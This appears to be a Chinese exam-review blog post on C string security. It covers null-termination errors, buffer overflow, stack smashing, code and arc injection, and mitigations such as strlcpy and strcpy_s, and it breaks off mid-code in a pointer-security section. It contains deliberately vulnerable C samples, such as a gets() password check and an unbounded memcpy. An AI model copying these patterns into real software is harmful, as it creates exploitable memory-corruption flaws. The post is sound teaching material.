<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"><span class="type">char</span> a[<span class="number">16</span>];</span><br><span class="line"><span class="type">char</span> b[<span class="number">16</span>];</span><br><span class="line"><span class="type">char</span> c[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">strncpy</span>(a, <span class="string">&quot;0123456789abcdef&quot;</span>, <span class="keyword">sizeof</span>(a));</span><br><span class="line"><span class="built_in">strncpy</span>(b, <span class="string">&quot;0123456789abcdef&quot;</span>, <span class="keyword">sizeof</span>(b)); </span><br><span class="line"><span class="comment">// **a[]和b[]都没有正确地结尾**</span></span><br><span class="line"><span class="built_in">strncpy</span>(c, a, <span class="keyword">sizeof</span>(c));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(2)从数组S2中<strong>复制不超过n个字符串(空字符后的字符不会被复制)到目标数组S1中。</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> * <span class="keyword">restrict</span> s1, <span class="type">const</span> <span class="type">char</span> * <span class="keyword">restrict</span> s2, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure>

<p>因此，如果第一个数组S2中的前n个字符中不存在空字符，那么其结果字符串<strong>将不会是以空字符结尾的。</strong></p>
<h4 id="4-字符串截断"><a href="#4-字符串截断" class="headerlink" title="4.字符串截断"></a>4.字符串截断</h4><p>（1）<strong>一些限制字节数的函数</strong>通常用来防止缓冲区溢出漏洞：<strong>strncpy()代替strcpy()、fgets()代替gets()、snprintf()代替sprintf()</strong></p>
<p>（2）当<strong>目标字符数组的长度不足以容纳一个字符串的内容时</strong>，就会发生字符串截断</p>
<p>（3）字符串截断<strong>会丢失数据</strong>，有时也会导致软件漏洞</p>
<h4 id="5-数组写入越界"><a href="#5-数组写入越界" class="headerlink" title="5.数组写入越界"></a><strong>5.数组写入越界</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123; <span class="comment">// 参数超过128，数组越界</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">128</span>];</span><br><span class="line"><span class="type">char</span> *arg1 = argv[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">while</span> (arg1[i] != <span class="string">&#x27;\0&#x27;</span> ) &#123;</span><br><span class="line">buff[i] = arg1[i];</span><br><span class="line">i++;&#125;</span><br><span class="line">buff[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;buff = %s\n&quot;</span>, buff);&#125;</span><br></pre></td></tr></table></figure>

<p>由于C风格字符事实上就是字符数组，因此完全有可能在<strong>不调用任何函数的情况下</strong>做了不安全的字符串操作。</p>
<h3 id="字符串问题导致的安全漏洞"><a href="#字符串问题导致的安全漏洞" class="headerlink" title="字符串问题导致的安全漏洞"></a>字符串问题导致的安全漏洞</h3><p><strong>字符串问题导致安全漏洞有：缓冲区溢出</strong>、<strong>程序栈</strong>、<strong>代码注入</strong>、<strong>弧注入</strong>。</p>
<p>1.程序栈</p>
<p>（1）栈通过<strong>存储下列内容</strong>来追踪程序的执行和状态：<strong>调用函数的返回地址、函数参数、局部（临时）变量</strong></p>
<p>（2）在下列情况下栈需要被修改：<strong>在函数调用期间、函数初始化期间、从子例程返回时</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2017.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2018.png" alt="image.png"></p>
<p>（3）堆栈<strong>支持嵌套调用</strong>，帧指<strong>由函数调用引发的压入栈的数据。</strong></p>
<p>（4）当前帧的地址被存储到<strong>帧或者基址寄存器中</strong>(英特尔架构中的EBP)</p>
<p>（5）<strong>帧指针在栈中是一个定点的引用。</strong></p>
<p>2.栈要被修改的情况</p>
<p><strong>（1）子例程调用</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2019.png" alt="image.png"></p>
<p><strong>（2）子例程初始化</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2020.png" alt="image.png"></p>
<p><strong>（3）从子例程返回</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2021.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2022.png" alt="image.png"></p>
<p>（4）程序案例</p>
<p>考试12分大题原题：根据输入的不同，列举并分析下图程序可能的结果？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">IsPasswordOK</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">char</span> Password[<span class="number">12</span>]; <span class="comment">// Memory 存储pwd</span></span><br><span class="line">gets(Password); <span class="comment">// Get input from keyboard</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(Password,<span class="string">&quot;goodpass&quot;</span>)) <span class="keyword">return</span>(<span class="literal">true</span>); </span><br><span class="line"><span class="comment">// Password Good</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span>(<span class="literal">false</span>); <span class="comment">// Password Invalid</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">bool</span> PwStatus; <span class="comment">// Password Status</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Enter Password:&quot;</span>); <span class="comment">// Print</span></span><br><span class="line">PwStatus=IsPasswordOK(); <span class="comment">// Get &amp; Check Password</span></span><br><span class="line"><span class="keyword">if</span> (PwStatus == <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Access denied&quot;</span>); <span class="comment">// Print</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>); <span class="comment">// Terminate Program&#125;</span></span><br><span class="line"><span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;Access granted&quot;</span>);<span class="comment">// Print&#125;</span></span><br></pre></td></tr></table></figure>

<p>答题：</p>
<p><strong>（1）输入”goodpass”（正确密码）。</strong>结果显示”Access granted”。因为strcmp比较字符串相等返回0，!0&#x3D;1，返回true。</p>
<p><strong>（2）输入其他错误密码（长度≤11字符）</strong>：”wrong”、”123456”、”hello123”。显示”Access denied”并退出。因为strcmp返回非0，!非0&#x3D;0，返回false。</p>
<p><strong>（3）输入长度≥12字符的字符串</strong>：”AAAAAAAAAAAA”（12个A）。由于长度：<strong>12字符+\0&#x3D;13字节&gt;数组大小12字节</strong>。Password[12]只能存储11个字符+1个’\0’，<strong>输入≥12字符会导致数组越界，</strong>结果缓冲区溢出。可能导致破坏<strong>栈上相邻内存、可能修改函数返回地址、程序可能崩溃</strong>（段错误）、可能被利用执行任意代码。</p>
<p>①执行IsPasswordOK()函数之前，栈中的信息</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2023.png" alt="image.png"></p>
<p>②IsPasswordOK()执行时栈中的信息</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2024.png" alt="image.png"></p>
<p>③IsPasswordOK()调用后栈中的信息</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2025.png" alt="image.png"></p>
<p>3.栈粉碎：当<strong>缓冲区溢出覆写分配给执行栈内存中的数据时</strong>，就会导致栈粉碎。成功的利用这个漏洞能够<strong>覆写栈返回地址</strong>，从而在目标机器中执行任意代码。</p>
<p>4.代码注入</p>
<p>（1）攻击者创建一个<strong>恶意参数：</strong>一个蓄意构造的<strong>字符串，</strong>其中包含一个<strong>指向某些恶意代码的指针</strong>，该代码也由攻击者提供。</p>
<p>（2）当函数返回时，控制就被转移到了<strong>那段恶意代码</strong>。注入的代码就会以<strong>与该有漏洞的程序相同的权限运行。</strong>攻击者通常都以<strong>以root或其他较高权限运行</strong>的程序为目标。</p>
<p>（3）实例</p>
<p>通过下面的二进制输入，这个密码程序能够被用来执行任意的代码:</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2026.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2027.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2028.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2029.png" alt="image.png"></p>
<p>5.弧注入</p>
<p>（1）定义：弧注入<strong>将控制转移到已经存在于程序内存空间中的代码中。</strong></p>
<p>（2）方式：在程序的控制流团中<strong>插入一段新的弧</strong>（表示控制流转移），而不是进行代码注入。可以<strong>安装一个已有函数的地址</strong>（如system()或exec()），用于执行已存在于本地系统上的程序。更复杂的攻击可能会使用这种技术。</p>
<p>（3）漏洞程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_buff</span><span class="params">(<span class="type">char</span> *user_input)</span>&#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(buff, user_input, <span class="built_in">strlen</span>(user_input)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">get_buff(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>利用：用<strong>存在的函数地址覆写</strong>返回地址；<strong>创建栈帧来链接</strong>函数调用；再现原始帧返回的程序，<strong>不进行检测并恢复执行。</strong></p>
<p>（4）相关流程</p>
<p>①缓冲区溢出之前及之后的栈</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2030.png" alt="image.png"></p>
<p>②get_buff()返回</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2031.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2032.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2033.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2034.png" alt="image.png"></p>
<p>③f()返回</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2035.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2036.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2037.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2038.png" alt="image.png"></p>
<p>④g()返回</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2039.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2040.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2041.png" alt="image.png"></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2042.png" alt="image.png"></p>
<h3 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h3><p>缓解措施包括：<strong>预防</strong>缓冲区溢出；<strong>侦测</strong>缓冲区溢出<strong>并安全地恢复</strong>，使得<strong>漏洞利用</strong>的企图无法得逞。</p>
<p>防范策略：<strong>静态分配空间、动态分配空间。</strong></p>
<p>1.静态方法</p>
<p><strong>静态分配缓冲区</strong>：假设一个<strong>固定大小的缓冲区。</strong>在缓冲区<strong>满了以后不可能添加再数据</strong>，因为静态的方法<strong>丢弃了超出的数据，</strong>所以实际的程序数据会丢失。因此，生成的字符串<strong>必须被充分验证。</strong></p>
<p>（1）<strong>输入长度验证</strong>：缓冲区溢出通常是<strong>字符串或内存越界拷贝</strong>的结果。缓冲区溢出是<strong>确保输入数据的大小不超过其存储的最小缓冲区</strong>来可以预防。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">myfunc</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *arg)</span> &#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strlen</span>(arg) **&gt;=** <span class="keyword">sizeof</span>(buff)) &#123;</span><br><span class="line"><span class="built_in">abort</span>();&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>（2）<strong>使用strlcpy()和strlcat()<strong>。更</strong>安全</strong>，确保结果<strong>非空结尾</strong>。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">strlcpy</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">strlcat</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>strlcpy()：</strong>从src复制空结尾的字符串到dst（<strong>直到size大小</strong>的字符）。</p>
<p><strong>strlcat()：把非空结尾的字符串src连接到dst末尾</strong>（<strong>不超过size</strong>的字符都能够连接到dst末尾）。</p>
<p>①为了阻止缓冲区溢出，strlcpy()和strlcat()<strong>接受size大小的目标字符串</strong>作为参数。对于静态分配目标缓冲区来说，这个值能够<strong>很容易地通过sizeof()操作来获取</strong>。<strong>动态缓冲区的大小不容易计算。</strong></p>
<p>②两个函数都确保目标字符串<strong>对所有非零长度的缓冲区来说都是非空结尾的</strong>。</p>
<p>③strlcpy()和strlcat()函数<strong>返回它们希望创建的字符串的总长度</strong>。strlcpy()简单返回<strong>源字符串的总长度</strong>。strlcat()返回（连接前）<strong>目标字符串的长度加上源字符串的长度</strong>。</p>
<p>④为了检查<strong>字符串截断</strong>，程序需要验证<strong>返回值是否小于参数大小。</strong>如果返回的字符串被程序员截断了，知道需要存储的字符串的字节数目，<strong>可能重新分配或者重新复制。</strong></p>
<p>⑤如果指定的缓冲区大小<strong>比实际的缓冲区长度长</strong>，不正确的使用这些函数<strong>仍然可能会导致缓冲区溢出。</strong>如果程序员<strong>无法验证这些函数结果</strong>，仍可能发生截断错误。</p>
<p>（3）使用新的<strong>安全规范函数</strong>。strcpy_s()代替strcpy()、strcat_s()代替strcat()、strncpy_s()代替strncpy()、strncat_s()代替strncat()。</p>
<p>①<strong>缓解</strong>缓冲区溢出攻击，默认<strong>保护与计划相关文件。</strong></p>
<p>②不产生<strong>无结尾的字符串</strong>，不意外<strong>截断字符串</strong>，保存<strong>空字符结尾的字符串</strong>数据类型，支持<strong>编译时检查</strong>，使<strong>失败显现</strong>，有一个<strong>统一的函数参数和返回类型</strong>模式。</p>
<p>③strcpy_s()函数：把字符<strong>从源字符串复制到目标字符数组</strong>，直到并包括终止null字符。与strcpy()类似，包含一个<strong>额外的rsize_t参数类型</strong>来确定目标缓冲区的最大长度。只有当源字符串可以<strong>完全复制</strong>到目标缓冲区，且目标缓冲区<strong>没有发生溢出时</strong>，才算成功。</p>
<p>2.动态方法</p>
<p><strong>动态地分配缓冲区：</strong>动态分配的缓冲区需要<strong>动态调整额外的内存</strong>。动态方法更好，而且<strong>不丢弃多余的数据（练习题把这个当成缺点）</strong>。主要缺点是如果输入被限制，则可能<strong>耗尽机器内存</strong>，结果<strong>导致拒绝服务攻击。</strong></p>
<p>（1）SafeStr：使用<strong>一种动态分配的方式</strong>，可以在需要时<strong>自动调整字符串的大小</strong>。SafeStr通过在<strong>需要精加字符串大小的操作中</strong>，<strong>重新分配内存并移动字符串内容</strong>来实现这一点。因此，在使用这个库的时候<strong>不会发生缓冲区溢出。</strong></p>
<p>①类型：SafeStr库基于safestr_t类型。该类型保存了<strong>由该指针所引用的内存部分的说明信息</strong>（例如<strong>实际长度和分配的长度</strong>），保存子指针所指向的内存之前。</p>
<p>②错误处理：使用<strong>XXL库</strong>来执行错误处理。为C和C++提供了<strong>异常和资产管理，</strong>调用者负责<strong>处理异常</strong>。如果没有<strong>指定异常处理程序</strong>，则默认情况下<strong>输出消息到stderr，调用abort()<strong>。依赖XXL可能会出现一个问题，因为</strong>两个库需要用来支持这个解决方案</strong>。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/09c2a25d9155e4d4fd992409778bb9a.png" alt="09c2a25d9155e4d4fd992409778bb9a.png"></p>
<p>（2）管理字符串</p>
<p><strong>①管理动态字符串</strong>：<strong>分配缓冲区。</strong>如果需要额外的内存，则<strong>重新调整内存大小。</strong></p>
<p>②管理字符串操作以确保<strong>字符串操作没有导致缓冲区溢出，数据没有丢失，字符串正常终止</strong>(字符串可能是也可能不是内部空结尾)。</p>
<p>③缺点：无限制地<strong>消耗内存</strong>，可能导致<strong>拒绝服务攻击</strong>，性能开销。</p>
<p>④数据类型：使用一个<strong>不透明的数据类型</strong>管理字符串。这种类型的特征是<strong>私有的，特定实现的。</strong></p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/e3a0d693e89bdd2320765c13e03ab45.png" alt="e3a0d693e89bdd2320765c13e03ab45.png"></p>
<p>（3）<strong>黑名单</strong>：用<strong>下划线或其他无害的字符</strong>来取代<strong>危险的字符串输入。</strong></p>
<p>（4）<strong>白名单：</strong>定义<strong>可接受的字符列表</strong>，<strong>删除</strong>任何不可接受的字符。</p>
<p>（5）数据处理：字符串管理库通过确保字符串中的所有字符<strong>属于一组预定义的安全字符</strong>，来提供一种<strong>处理数据</strong>的机制。</p>
<h2 id="指针安全"><a href="#指针安全" class="headerlink" title="指针安全"></a>指针安全</h2><h3 id="网安内容"><a href="#网安内容" class="headerlink" title="网安内容"></a>网安内容</h3><p>1.指针安全的概念：是<strong>通过修改指针值来利用程序漏洞</strong>的方法的统称。可以通过<strong>覆盖函数指针</strong>将程序的<strong>控制权转移到攻击者提供的shellcode</strong>。也可以<strong>修改对象指针</strong>，从而执行任意代码。</p>
<p>2.缓冲区溢出覆写指针条件（考了n次）</p>
<p>（1）缓冲区与目标指针<strong>必须分配在同一个段内。</strong>比如，<strong>缓冲区和函数指针都未初始化，因此都存在于BSS段</strong>。</p>
<p>（2）缓冲区必须位于<strong>比目标指针更低的内存地址处。</strong></p>
<p>（3）该缓冲区必须是<strong>界限不充分的</strong>，因此容易被缓冲区溢出利用。</p>
<p>（4）缓冲区必须可以被缓冲区溢出利用。（废话）</p>
<p>3.<strong>UNIX可执行文件</strong>（包含data段和BSS段）相关概念</p>
<p>（1）<strong>data段</strong>包含了所有<strong>已初始化的全局变量和常数，BSS段</strong>包含了<strong>所有未初始化的全局变量</strong></p>
<p>（2）<strong>已初始化的全局变量和未初始化变量</strong>分开是为了让汇编器<strong>不将未初始化的变量内容写入目标文件</strong></p>
<p>要熟悉这段代码，练习题有，考某行代码存储空间在哪？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> GLOBAL_INIT = <span class="number">1</span>; <span class="comment">/* data segment, global */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> global_uninit; <span class="comment">/* BSS segment, global */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123; <span class="comment">/* stack, local */</span></span><br><span class="line"><span class="type">int</span> local_init = <span class="number">1</span>; <span class="comment">/* stack, local */</span></span><br><span class="line"><span class="type">int</span> local_uninit; <span class="comment">/* stack, local */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> local_static_init = <span 